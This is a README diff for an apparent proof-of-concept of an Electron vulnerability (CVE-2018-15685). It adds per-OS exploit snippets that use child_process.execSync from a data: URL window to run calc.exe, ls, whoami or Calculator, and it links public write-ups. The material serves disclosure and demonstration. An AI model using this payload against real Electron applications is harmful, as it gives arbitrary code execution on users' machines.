@@ -27,9 +27,34 @@ npm install
 # Run the app
 npm start
 ```
+## To Run
 
+### Windows
+```
+# Exploit Code
+window.open().open('data:text/html,Code Execution <br><pre>Exploited: <pre><script>document.write(require("child_process").execSync("calc.exe"))</scr'+'ipt></pre></br></br><pre>Whoami: <pre><script>document.write(require("child_process").execSync("whoami"))</scr'+'ipt></pre></pre>');
+
+# Which Executes Calculator and shows which user is currently logged in
+```
+![Windows](https://media.giphy.com/media/jnRVmVJQ0oIpJ7JdbZ/giphy.gif)
     
+### Linux
+```
+# Exploit Code
+window.open().open('data:text/html,Code Execution <br><pre>Exploited: <pre><script>document.write(require("child_process").execSync("ls"))</scr'+'ipt></pre></br></br><pre>Whoami: <pre><script>document.write(require("child_process").execSync("whoami"))</scr'+'ipt></pre></pre>');
 
+# Which lists files and shows which user is currently logged in
+```
+![Linux](https://media.giphy.com/media/4ZcOpedgQBPMMWdHsN/giphy.gif)
+
+### Mac
+```
+# Exploit Code
+window.open().open('data:text/html,Code Execution <br><pre>Exploited: <pre><script>document.write(require("child_process").execSync("ls"))</scr'+'ipt></pre></br></br><pre>Whoami: <pre><script>document.write(require("child_process").execSync("open /Applications/Calculator.app"))</scr'+'ipt></pre></pre>');
+
+# Which Executes Calculator and lists files in the directory
+```
+![Linux](https://media.giphy.com/media/48M4iTS1Ue0IU8jetT/giphy.gif)
 **For More Information about this Vulnerability **
 Full write up on the [Contrast Security blog](https://www.contrastsecurity.com/security-influencers/cve-2018-15685) or the write up on the offical blog from [Electron](https://electronjs.org/blog/web-preferences-fix)
 
